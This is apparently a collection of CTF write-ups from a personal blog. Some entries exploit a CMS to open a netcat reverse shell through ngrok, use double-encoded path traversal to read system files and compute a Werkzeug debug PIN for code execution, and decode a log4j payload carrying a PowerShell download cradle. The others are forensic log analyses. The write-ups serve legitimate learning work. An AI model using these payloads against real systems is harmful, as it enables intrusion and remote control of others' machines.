[{"content":"Statement:\n! Welcome to Insomnihack 2023 !\nLet\u0026rsquo;s start with an easy and well-known web exploitation.\nA hipster welcome for hipster scriptkiddies, here you go!\nhttps://welcome.insomnihack.ch:8443\nThe URL provided in the statement refers to a login page using the Kagus CMS. By filling the fields with random values, the server sends me back the following answer :\nHTTP/1.1 200 OK Date: Sat, 21 Jan 2023 14:16:19 GMT Server: Apache/2.4.54 (Unix) OpenSSL/3.0.7 X-Powered-By: PHP/8.1.14 Connection: close Content-Type: text/html; charset=UTF-8 Content-Length: 101 This Kagus installation deactivated the login form.\u0026lt;br\u0026gt;It will not be possible to connect through it. After a few tries, the login page seemed to be secure so I decided to go to the editor\u0026rsquo;s website present on the footer of the page : https://kagus-cms.com\nOn the site, in the released page, I see that there was a fix on the login form for the release v23.1.0 : Our target is still on the v22.4.2 version, it seems exploitable !\nThe link refers to a git repository containing the POC to exploit this vulnerability.\nI start by cloning the git repos and build binary :\ngit clone https://github.com/Tomat0Soup/Kagus-PoC.git cd Kagus-PoC \u0026amp;\u0026amp; go build I setup my environment to receive the revshell :\nngrok tcp 1337 nc -lvnp 1337 Then I execute the binary by specifying the target and command : ./kagus_exploit\nTarget (e.g. https://localhost:9000): https://welcome.insomnihack.ch:8443 Command (e.g. nc 192.168.0.10 2345 -e sh): nc 7.tcp.eu.ngrok.io 18603 -e sh [*] INFO: Preparing to send command: \u0026#34;nc 7.tcp.eu.ngrok.io 18603 -e sh\u0026#34; to \u0026#34;https://welcome.insomnihack.ch:8443\u0026#34; [*] INFO: Sending request... [*] INFO: Request sent, status: 504 [*] INFO: The command \u0026#34;%s\u0026#34; should have been executed on %s. nc 7.tcp.eu.ngrok.io 18603 -e sh https://welcome.insomnihack.ch:8443/admin/api/v22.4/users/createUserAccount.php I get my revshell, I just have to cat the flag :\nListening on 0.0.0.0 1337 Connection received on 127.0.0.1 38762 id uid=65534(nobody) gid=65534(nobody) groups=65534(nobody) ls createUserAccount.php info_flag\tcat info_flag The flag is located at /flag.txt cat /flag.txt INS{N3V3r_7Ru57_917HUb_r3l34532!_4lw4Y2_KoMP1L3_7H3M} Flag: INS{N3V3r_7Ru57_917HUb_r3l34532!_4lw4Y2_KoMP1L3_7H3M}\n","permalink":"https://sanlokii.eu/writeups/insomnihack/welcome/","summary":"Statement:\n! Welcome to Insomnihack 2023 !\nLet\u0026rsquo;s start with an easy and well-known web exploitation.\nA hipster welcome for hipster scriptkiddies, here you go!\nhttps://welcome.insomnihack.ch:8443\nThe URL provided in the statement refers to a login page using the Kagus CMS. By filling the fields with random values, the server sends me back the following answer :\nHTTP/1.1 200 OK Date: Sat, 21 Jan 2023 14:16:19 GMT Server: Apache/2.4.54 (Unix) OpenSSL/3.","title":"Insomni'hack Teaser : Welcome"},{"content":"Statement:\nOne of my college friend is learning web-dev with Flask . One day he showed me his very first website for file searching. But he did a mistake. And somehow I managed to break into his website. Now can you spot the mistake and help him to secure his site?\nDemo Flag: KCTF{Fl4g_H3r3}\nhttp://167.99.8.90:7777/\nBy visiting the website, I can see the presence of a search field : During a search, a POST request is made on the filename parameter :\nPOST /home HTTP/1.1 Host: 167.99.8.90:7777 Content-Length: 10 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://167.99.8.90:7777 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://167.99.8.90:7777/home Accept-Encoding: gzip, deflate Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close filename=x When trying to get an invalid path with GET request, I get the following page with error messages :\nIn the error messages, I can read the following source code :\nif __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=7777 , debug=True) The rendering of the error page and the messages indicate that the site runs under python with debug set to true.\nI decide to check the headers returned by the site to know the versions used : curl -I http://167.99.8.90:7777\nHTTP/1.1 200 OK Server: Werkzeug/2.2.2 Python/3.9.16 Date: Sun, 22 Jan 2023 15:56:37 GMT Content-Type: text/html; charset=utf-8 Content-Length: 1116 Connection: close With this information, a request on the endpoint /console should redirect me to a debug console but this one is protected via PIN authentication : It is possible to calculate the PIN by retrieving some metrics, for that I would have to find a LFI. Probably via a POST request on the /home endpoint !\nA simple search on app.py returns the source code : Here is the source code once beautifying :\nfrom flask import Flask, request, render_template, current_app import os, urllib app = Flask(__name__) @app.route(\u0026#34;/\u0026#34;) def start(): return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#34;/home\u0026#34;, methods=[\u0026#39;POST\u0026#39;]) def home(): filename = urllib.parse.unquote(request.form[\u0026#39;filename\u0026#39;]) data = \u0026#34;Try Harder.....\u0026#34; naughty = \u0026#34;../\u0026#34; if naughty not in filename: filename = urllib.parse.unquote(filename) if os.path.isfile(current_app.root_path + \u0026#39;/\u0026#39;+ filename): with current_app.open_resource(filename) as f: data = f.read() return render_template(\u0026#34;index.html\u0026#34;, read = data) @app.errorhandler(404) def ahhhh(e): return render_template(\u0026#34;ahhh.html\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=7777 , debug=True) By reading the source code, we know the following points :\nFilter on ../ Positionned on the root directory of the application + / With this information, a multiple encoding should allow to exploit a LFI.\nI will try to get the file /etc/passwd with double encoding :\n%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd Now I need to retrieve the following information to generate the PIN code :\nusername modname getattr(app, '__name__', getattr(app.__class__, '__name__')) getattr(mod, '__file__', None) str(uuid.getnode()) machine-id I know already some values :\nusername value from /etc/passwd : yooboi modname : flask.app getattr(app, '__name__', getattr(app.__class__, '__name__')) : Flask I find getattr(mod, '__file__', None) value from the traceback page : For str(uuid.getnode()) value, I get the file /proc/net/arp through LFI :\n%252E%252E%252F%252E%252E%252F%252E%252E%252Fproc%252Fnet%252Farp Now I know I can get the file linked to eth0 /sys/class/net/eth0/address :\n%252E%252E%252F%252E%252E%252F%252E%252E%252Fsys%252Fclass%252Fnet%252Feth0%252Faddress I convert MAC adress to decimal expression :\n\u0026gt;\u0026gt;\u0026gt; print(0x0242ac110003) 2485377892355 And the latest value machine-id from /proc/sys/kernel/random/boot_id :\n%252E%252E%252F%252E%252E%252F%252E%252E%252Fproc%252Fsys%252Fkernel%252Frandom%252Fboot_id I\u0026rsquo;ve to adapt the script with our values :\nimport hashlib from itertools import chain probably_public_bits = [ \u0026#39;yooboi\u0026#39;,# username \u0026#39;flask.app\u0026#39;,# modname \u0026#39;Flask\u0026#39;,# getattr(app, \u0026#39;__name__\u0026#39;, getattr(app.__class__, \u0026#39;__name__\u0026#39;)) \u0026#39;/usr/local/lib/python3.9/site-packages/flask/app.py\u0026#39; # getattr(mod, \u0026#39;__file__\u0026#39;, None), ] private_bits = [ \u0026#39;2485377892355\u0026#39;,# str(uuid.getnode()), /sys/class/net/ens33/address \u0026#39;e01d426f-826c-4736-9cd2-a96608b66fd8\u0026#39;# get_machine_id(), /etc/machine-id ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\u0026#39;utf-8\u0026#39;) h.update(bit) h.update(b\u0026#39;cookiesalt\u0026#39;) #h.update(b\u0026#39;shittysalt\u0026#39;) cookie_name = \u0026#39;__wzd\u0026#39; + h.hexdigest()[:20] num = None if num is None: h.update(b\u0026#39;pinsalt\u0026#39;) num = (\u0026#39;%09d\u0026#39; % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \u0026#39;-\u0026#39;.join(num[x:x + group_size].rjust(group_size, \u0026#39;0\u0026#39;) for x in range(0, len(num), group_size)) break else: rv = num print(rv) I get back the value 276-444-173 but this PIN code didn\u0026rsquo;t unlock the access to the console.\nFrom that moment, my team and I were stuck on this challenge.\nLater, we found this resource that specifies the following point :\nNewer versions of Werkzeug use SHA1 instead of MD5\nAll that was left was to modify the script to use SHA1 :\nh = hashlib.sha1() #h = hashlib.md5() I get the following PIN code : 695-086-043 and this one unlock the access to the console.\nOnce access to the console, it is possible to RCE via a python shell : Flag: KCTF{n3v3r_run_y0ur_53rv3r_0n_d3bu6_m0d3}\nWe were a little frustrated to not finish it in time, but the challenge was interesting.\n","permalink":"https://sanlokii.eu/writeups/knightctf/knight-search/","summary":"Statement:\nOne of my college friend is learning web-dev with Flask . One day he showed me his very first website for file searching. But he did a mistake. And somehow I managed to break into his website. Now can you spot the mistake and help him to secure his site?\nDemo Flag: KCTF{Fl4g_H3r3}\nhttp://167.99.8.90:7777/\nBy visiting the website, I can see the presence of a search field : During a search, a POST request is made on the filename parameter :","title":"KnightCTF : Knight Search"},{"content":"Statement: An attacker has installed a C2 persistence mechanism on this system.\nWhen is it scheduled to next execute? What C2 IP address is the PowerShell stager configured to connect to? Flag format: DUCTF{hh:mm_IP}\nFlag example: DUCTF{15:27_10.0.0.8}\nFile password: Awt4Wh6dT3by0hXmfFZn\nThe challenge provides the dfir-investigation zip file.\nAfter extracting the zip, I get the file triage-image.ad1\nTo read the content of this file, I will use the FTK Imager tool via windows.\nI will start by recovering different event logs in order to retrieve information located at the path: `C:\\Windows\\System32\\winevt\\Logs``\nIn the powershell operational event log, I will find a payload that looks suspicious:\nI notice that there is a base64 encoded string in the payload, so I will decode it:\necho \u0026#34;aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADIANwA6ADcANwA3ADcA\u0026#34; | base64 -d Output:\nhttp://192.168.0.27:7777 We have retrieved the IP, now we need to find the next execution time.\nThe command and control persistence mechanism uses WMI objects.\nWhen creating or modifying a WMI object, windows updates the base files of the WMI repository in C:\\windows\\system32\\wbem\\repository\nThe file that will interest me in this directory is OBJECTS.DATA because it contains a lot of information about the modifications of WMI objects in clear text.\nI will search for the word powershell within the file and I will get this logs followed by the encoded payload:\nSELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \u0026#39;Win32_LocalTime\u0026#39; AND TargetInstance.Hour = 12 AND TargetInstance.Minute= 38 GROUP WITHIN 60 We know that the next execution will be at 12:38.\nFlag: DUCTF{12:38_192.168.0.27}\n","permalink":"https://sanlokii.eu/writeups/downunderctf/dfir-investigation-1/","summary":"Statement: An attacker has installed a C2 persistence mechanism on this system.\nWhen is it scheduled to next execute? What C2 IP address is the PowerShell stager configured to connect to? Flag format: DUCTF{hh:mm_IP}\nFlag example: DUCTF{15:27_10.0.0.8}\nFile password: Awt4Wh6dT3by0hXmfFZn\nThe challenge provides the dfir-investigation zip file.\nAfter extracting the zip, I get the file triage-image.ad1\nTo read the content of this file, I will use the FTK Imager tool via windows.","title":"DownUnderCTF : DFIR Investigation 1"},{"content":"Statement: if you see this you have to post in #memes thems the rules\ndocker run -tp 8000:8000 downunderctf/onions I start by reading the history of the docker image:\nsudo docker image history downunderctf/onions IMAGE CREATED CREATED BY SIZE COMMENT e4ad5b4d9379 3 days ago CMD [\u0026#34;/usr/local/bin/python\u0026#34; \u0026#34;-m\u0026#34; \u0026#34;http.serv… 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 3 days ago EXPOSE map[8000/tcp:{}] 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 3 days ago RUN /bin/sh -c rm memes/flag.jpg # buildkit 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 3 days ago COPY . /app # buildkit 527kB buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 10 days ago WORKDIR /app 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 2 weeks ago /bin/sh -c #(nop) CMD [\u0026#34;python3\u0026#34;] 0B \u0026lt;missing\u0026gt; 2 weeks ago /bin/sh -c set -eux; wget -O get-pip.py \u0026#34;$… 10.9MB \u0026lt;missing\u0026gt; 2 weeks ago /bin/sh -c #(nop) ENV PYTHON_GET_PIP_SHA256… 0B \u0026lt;missing\u0026gt; 2 weeks ago /bin/sh -c #(nop) ENV PYTHON_GET_PIP_URL=ht… 0B \u0026lt;missing\u0026gt; 2 weeks ago /bin/sh -c #(nop) ENV PYTHON_SETUPTOOLS_VER… 0B \u0026lt;missing\u0026gt; 2 weeks ago /bin/sh -c #(nop) ENV PYTHON_PIP_VERSION=22… 0B \u0026lt;missing\u0026gt; 2 weeks ago /bin/sh -c set -eux; for src in idle3 pydoc… 32B \u0026lt;missing\u0026gt; 2 weeks ago /bin/sh -c set -eux; apk add --no-cache --… 30.5MB \u0026lt;missing\u0026gt; 2 weeks ago /bin/sh -c #(nop) ENV PYTHON_VERSION=3.10.7 0B \u0026lt;missing\u0026gt; 6 weeks ago /bin/sh -c #(nop) ENV GPG_KEY=A035C8C19219B… 0B \u0026lt;missing\u0026gt; 6 weeks ago /bin/sh -c set -eux; apk add --no-cache c… 1.82MB \u0026lt;missing\u0026gt; 6 weeks ago /bin/sh -c #(nop) ENV LANG=C.UTF-8 0B \u0026lt;missing\u0026gt; 6 weeks ago /bin/sh -c #(nop) ENV PATH=/usr/local/bin:/… 0B \u0026lt;missing\u0026gt; 6 weeks ago /bin/sh -c #(nop) CMD [\u0026#34;/bin/sh\u0026#34;] 0B \u0026lt;missing\u0026gt; 6 weeks ago /bin/sh -c #(nop) ADD file:2a949686d9886ac7c… 5.54MB I notice that the file containing probably the flag (flag.jpg) has been deleted during the last modifications.\nSo I decide to inspect the content of the image in search of information:\nsudo docker inspect downunderctf/onions One piece of information will catch my attention, the layers:\n\u0026#34;RootFS\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;layers\u0026#34;, \u0026#34;Layers\u0026#34;: [ \u0026#34;sha256:994393dc58e7931862558d06e46aa2bb17487044f670f310dffe1d24e4d1eec7\u0026#34;, \u0026#34;sha256:bdd2dbc0f630af3f7c2cb6389503e7973143e950ae8d775e0905ca27ac43d6c1\u0026#34;, \u0026#34;sha256:765276be336a7e58719078ab0668c7fc2cc1da94bd07be942b3afa5f34890716\u0026#34;, \u0026#34;sha256:71aefba622a6cb157c4c969f3ecb5b258888c9163a50193263db5b35679b0784\u0026#34;, \u0026#34;sha256:804e16ced35b2b66dc7e569b56850f09edb4ecd9fe9fdb64882562d909335b74\u0026#34;, \u0026#34;sha256:95efea6a20579cecd96c550c1fb443a39f59ca12e4719c84951a8d38b6e02322\u0026#34;, \u0026#34;sha256:d22845d014e3f57356f7b944067bedaff9839534bb52e4ef93c8e40123022ec1\u0026#34;, \u0026#34;sha256:99d81c358faa406f7a0da8ab42896478d7da83230fa102d8fcf06b603ec71327\u0026#34; ] } After, I use the dive tool which allows to inspect the docker layers:\nsudo dive downunderctf/onions I see that the layer below with the ID 506946d44c8939efe882d5fd59797d22f2fe84adb7e2b7af066ca1563c11d464 contains the flag file:\nSo I will save the image in a tarball:\nsudo docker save -o flag.tar downunderctf/onions Extract the content of the target layer and read the content of the file:\ncd 506946d44c8939efe882d5fd59797d22f2fe84adb7e2b7af066ca1563c11d464 \u0026amp;\u0026amp; sudo tar xvf layer.tar Now, I just\u0026rsquo;ve to read the content of the file flag.jpg.\nFlag: DUCTF{P33L_B4CK_TH3_L4Y3RS}\n","permalink":"https://sanlokii.eu/writeups/downunderctf/ogres-are-like-onions/","summary":"Statement: if you see this you have to post in #memes thems the rules\ndocker run -tp 8000:8000 downunderctf/onions I start by reading the history of the docker image:\nsudo docker image history downunderctf/onions IMAGE CREATED CREATED BY SIZE COMMENT e4ad5b4d9379 3 days ago CMD [\u0026#34;/usr/local/bin/python\u0026#34; \u0026#34;-m\u0026#34; \u0026#34;http.serv… 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 3 days ago EXPOSE map[8000/tcp:{}] 0B buildkit.dockerfile.v0 \u0026lt;missing\u0026gt; 3 days ago RUN /bin/sh -c rm memes/flag.jpg # buildkit 0B buildkit.","title":"DownUnderCTF : Ogres are like onions"},{"content":"Statement: We\u0026rsquo;ve seen some vulnerability scanning activity against us!\nWhat was the name of the tool used?\nFlag format: Name of the tool used, case insensitive\nThe challenge provides a JSON file containing logs.\nThese logs and scenarios are designed to be real-ish, they\u0026rsquo;re simpler and given that the entire data set covers 1hr all malicious activity is conducted on a condensed time frame.\nLooking at the logs, I notice that an IP is performing an automated file scan:\n{ \u0026#34;_time\u0026#34;: \u0026#34;2021-01-01T09:01:12.000+0000\u0026#34;, \u0026#34;origin\u0026#34;: \u0026#34;194.163.140.128\u0026#34;, \u0026#34;site\u0026#34;: \u0026#34;shop.downunderctf.com\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;referer\u0026#34;: \u0026#34;null\u0026#34;, \u0026#34;useragent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;shop.downunderctf.com/wp-content/uploads/simple-file-list/nuclei.php\u0026#34;, \u0026#34;logSource\u0026#34;: \u0026#34;Http:Web\u0026#34; } { \u0026#34;_time\u0026#34;: \u0026#34;2021-01-01T09:01:13.000+0000\u0026#34;, \u0026#34;origin\u0026#34;: \u0026#34;194.163.140.128\u0026#34;, \u0026#34;site\u0026#34;: \u0026#34;shop.downunderctf.com\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;referer\u0026#34;: \u0026#34;null\u0026#34;, \u0026#34;useragent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;shop.downunderctf.com/CFIDE/administrator/enter.cfm\u0026#34;, \u0026#34;logSource\u0026#34;: \u0026#34;Http:Web\u0026#34; } { \u0026#34;_time\u0026#34;: \u0026#34;2021-01-01T09:01:14.000+0000\u0026#34;, \u0026#34;origin\u0026#34;: \u0026#34;194.163.140.128\u0026#34;, \u0026#34;site\u0026#34;: \u0026#34;shop.downunderctf.com\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;referer\u0026#34;: \u0026#34;null\u0026#34;, \u0026#34;useragent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;shop.downunderctf.com/cgi-bin/test/test.cgi\u0026#34;, \u0026#34;logSource\u0026#34;: \u0026#34;Http:Web\u0026#34; } { \u0026#34;_time\u0026#34;: \u0026#34;2021-01-01T09:01:15.000+0000\u0026#34;, \u0026#34;origin\u0026#34;: \u0026#34;194.163.140.128\u0026#34;, \u0026#34;site\u0026#34;: \u0026#34;shop.downunderctf.com\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;referer\u0026#34;: \u0026#34;null\u0026#34;, \u0026#34;useragent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;shop.downunderctf.com/favicon.ico\u0026#34;, \u0026#34;logSource\u0026#34;: \u0026#34;Http:Web\u0026#34; } { \u0026#34;_time\u0026#34;: \u0026#34;2021-01-01T09:01:16.000+0000\u0026#34;, \u0026#34;origin\u0026#34;: \u0026#34;194.163.140.128\u0026#34;, \u0026#34;site\u0026#34;: \u0026#34;shop.downunderctf.com\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;referer\u0026#34;: \u0026#34;null\u0026#34;, \u0026#34;useragent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;shop.downunderctf.com/nuclei.txt\u0026#34;, \u0026#34;logSource\u0026#34;: \u0026#34;Http:Web\u0026#34; } We can see that the attacker uses a predefined wordlist with his scan tool and that the requests are made at 1 second intervals.\nThe nuclei value comes up frequently, which makes me think that the attacker is using the nuclei tool with the default wordlist\nFlag: nuclei\n","permalink":"https://sanlokii.eu/writeups/downunderctf/shop-im-just-looking/","summary":"Statement: We\u0026rsquo;ve seen some vulnerability scanning activity against us!\nWhat was the name of the tool used?\nFlag format: Name of the tool used, case insensitive\nThe challenge provides a JSON file containing logs.\nThese logs and scenarios are designed to be real-ish, they\u0026rsquo;re simpler and given that the entire data set covers 1hr all malicious activity is conducted on a condensed time frame.\nLooking at the logs, I notice that an IP is performing an automated file scan:","title":"DownUnderCTF : Shop-I'm just looking!"},{"content":"Statement: Looks like there\u0026rsquo;s been a bruteforce/password spray attempt against the website!\nWhat\u0026rsquo;s the contact email for the ISP of the attacker\u0026rsquo;s IP?\nFlag format: Email address, case insensitive\nThe challenge provides a JSON file containing logs.\nThese logs and scenarios are designed to be real-ish, they\u0026rsquo;re simpler and given that the entire data set covers 1hr all malicious activity is conducted on a condensed time frame.\nIn these logs, I notice several points:\nMany POST requests on login page The user-agent value set to curl Recurrence of requests { \u0026#34;_time\u0026#34;: \u0026#34;2021-01-01T09:14:01.000+0000\u0026#34;, \u0026#34;origin\u0026#34;: \u0026#34;58.164.62.91\u0026#34;, \u0026#34;site\u0026#34;: \u0026#34;shop.downunderctf.com\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;POST\u0026#34;, \u0026#34;referer\u0026#34;: \u0026#34;null\u0026#34;, \u0026#34;useragent\u0026#34;: \u0026#34;curl/7.64.1\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;shop.downunderctf.com/login\u0026#34;, \u0026#34;logSource\u0026#34;: \u0026#34;Http:Web\u0026#34; } { \u0026#34;_time\u0026#34;: \u0026#34;2021-01-01T09:14:02.000+0000\u0026#34;, \u0026#34;origin\u0026#34;: \u0026#34;58.164.62.91\u0026#34;, \u0026#34;site\u0026#34;: \u0026#34;shop.downunderctf.com\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;POST\u0026#34;, \u0026#34;referer\u0026#34;: \u0026#34;null\u0026#34;, \u0026#34;useragent\u0026#34;: \u0026#34;curl/7.64.1\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;shop.downunderctf.com/login\u0026#34;, \u0026#34;logSource\u0026#34;: \u0026#34;Http:Web\u0026#34; } We can also see a little earlier the attempted XSS exploit with the same IP:\n{ \u0026#34;_time\u0026#34;: \u0026#34;2021-01-01T09:12:14.000+0000\u0026#34;, \u0026#34;origin\u0026#34;: \u0026#34;58.164.62.91\u0026#34;, \u0026#34;site\u0026#34;: \u0026#34;shop.downunderctf.com\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;referer\u0026#34;: \u0026#34;shop.downunderctf.com/product?id=%3Cscript%3Ealert%28%22Hacked%22%29%3C%2Fscript%3E\u0026#34;, \u0026#34;useragent\u0026#34;: \u0026#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;shop.downunderctf.com/login\u0026#34;, \u0026#34;logSource\u0026#34;: \u0026#34;Http:Web\u0026#34; } I perform a whois on the malicious IP 58.164.62.91 and I get the contact email address of the ISP.\nFlag: abuse@telstra.net\n","permalink":"https://sanlokii.eu/writeups/downunderctf/shop-knock-knock-knock/","summary":"Statement: Looks like there\u0026rsquo;s been a bruteforce/password spray attempt against the website!\nWhat\u0026rsquo;s the contact email for the ISP of the attacker\u0026rsquo;s IP?\nFlag format: Email address, case insensitive\nThe challenge provides a JSON file containing logs.\nThese logs and scenarios are designed to be real-ish, they\u0026rsquo;re simpler and given that the entire data set covers 1hr all malicious activity is conducted on a condensed time frame.\nIn these logs, I notice several points:","title":"DownUnderCTF : Shop-Knock Knock Knock"},{"content":"Statement: We implemented a basic IPS to help protect our site from new attacks.\nSomehow, a newer more sophisticated version of a regularly observed attack was successfully executed against the website.\nWhat is the name of the script that was run?\nFlag format: Name of the script that was run, case sensitive.\nThe challenge provides a JSON file containing logs.\nThese logs and scenarios are designed to be real-ish, they\u0026rsquo;re simpler and given that the entire data set covers 1hr all malicious activity is conducted on a condensed time frame.\nSearching in the logs, I notice that a log4j exploit has been performed:\n{ \u0026#34;_time\u0026#34;: \u0026#34;2021-01-01T09:29:13.000+0000\u0026#34;, \u0026#34;origin\u0026#34;: \u0026#34;119.17.132.75\u0026#34;, \u0026#34;site\u0026#34;: \u0026#34;shop.downunderctf.com\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;referer\u0026#34;: \u0026#34;shop.downunderctf.com/register\u0026#34;, \u0026#34;useragent\u0026#34;: \u0026#34;${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://41.108.181.141:5552/Basic/Command/Base64/cG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC1DICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZG93bnVuZGVyY3RmLmNvbS9wVENOcDVwNkxQMGQ3cUE3N3l2YjRTSGY0MCcpOyI=}\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;shop.downunderctf.com/Login\u0026#34;, \u0026#34;logSource\u0026#34;: \u0026#34;Http:Web\u0026#34; } The payload is base64 encoded, so I will decode it to read the content and get the name of the script:\necho \u0026#34;cG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC1DICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZG93bnVuZGVyY3RmLmNvbS9wVENOcDVwNkxQMGQ3cUE3N3l2YjRTSGY0MCcpOyI=\u0026#34; | base64 -d Payload value:\npowershell.exe -exec bypass -C \u0026#34;IEX (New-Object Net.WebClient).DownloadString(\u0026#39;https://downunderctf.com/pTCNp5p6LP0d7qA77yvb4SHf40\u0026#39;);\u0026#34; Flag: pTCNp5p6LP0d7qA77yvb4SHf40\n","permalink":"https://sanlokii.eu/writeups/downunderctf/shop-logging-for-what/","summary":"Statement: We implemented a basic IPS to help protect our site from new attacks.\nSomehow, a newer more sophisticated version of a regularly observed attack was successfully executed against the website.\nWhat is the name of the script that was run?\nFlag format: Name of the script that was run, case sensitive.\nThe challenge provides a JSON file containing logs.\nThese logs and scenarios are designed to be real-ish, they\u0026rsquo;re simpler and given that the entire data set covers 1hr all malicious activity is conducted on a condensed time frame.","title":"DownUnderCTF : Shop-Logging for what?"},{"content":"Statement: Someone was able to successfully break into the admin account!\nDo you know what the old password was?\nFlag format: The password, case insensitive\nThe challenge provides a JSON file containing logs.\nThese logs and scenarios are designed to be real-ish, they\u0026rsquo;re simpler and given that the entire data set covers 1hr all malicious activity is conducted on a condensed time frame.\nSearching in the logs, I find a log generated by the webmail indicating that the password for the admin@shop.downunderctf.com account has been changed:\n{ \u0026#34;_time\u0026#34;: \u0026#34;2021-01-01T09:26:52.000+0000\u0026#34;, \u0026#34;sender\u0026#34;: \u0026#34;noreply@shop.downunderctf.com\u0026#34;, \u0026#34;recipient\u0026#34;: \u0026#34;admin@shop.downunderctf.com\u0026#34;, \u0026#34;direction\u0026#34;: \u0026#34;Outgoing\u0026#34;, \u0026#34;outcome\u0026#34;: \u0026#34;Unknown\u0026#34;, \u0026#34;subject\u0026#34;: \u0026#34;Your shop.downunderctf.com Password Has Been Changed\u0026#34;, \u0026#34;attachments\u0026#34;: \u0026#34;null\u0026#34;, \u0026#34;logSource\u0026#34;: \u0026#34;Webmail\u0026#34; } I notice that at the same timestamp, a URL with a base64 encoding is generated:\n{ \u0026#34;_time\u0026#34;: \u0026#34;2021-01-01T09:26:52.000+0000\u0026#34;, \u0026#34;origin\u0026#34;: \u0026#34;58.164.62.91\u0026#34;, \u0026#34;site\u0026#34;: \u0026#34;shop.downunderctf.com\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;referer\u0026#34;: \u0026#34;shop.downunderctf.com/changepassword\u0026#34;, \u0026#34;useragent\u0026#34;: \u0026#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;shop.downunderctf.com/login?ref=M2RjOTE5ZGUxODZkMWE4ZWU2MmZmZjkyZDgwODM5Zjc6NmQ3YzViM2U3OTZkODMzYjNmZGQ0MGY0Y2U1N2ZhY2Q%3D\u0026#34;, \u0026#34;logSource\u0026#34;: \u0026#34;Http:Web\u0026#34; } I decode the string encoded in base64:\necho \u0026#34;M2RjOTE5ZGUxODZkMWE4ZWU2MmZmZjkyZDgwODM5Zjc6NmQ3YzViM2U3OTZkODMzYjNmZGQ0MGY0Y2U1N2ZhY2Q=\u0026#34; | base64 -d We get the following string corresponding to two MD5 hashes in the format oldpassword:newpassword:\n3dc919de186d1a8ee62fff92d80839f7:6d7c5b3e796d833b3fdd40f4ce57facd I couldn\u0026rsquo;t get the password value by dictionary attack or bruteforce with hashcat, so I used an online tool.\nFlag: ozzieozzieozzie\n","permalink":"https://sanlokii.eu/writeups/downunderctf/shop-oi-get-out-of-there/","summary":"Statement: Someone was able to successfully break into the admin account!\nDo you know what the old password was?\nFlag format: The password, 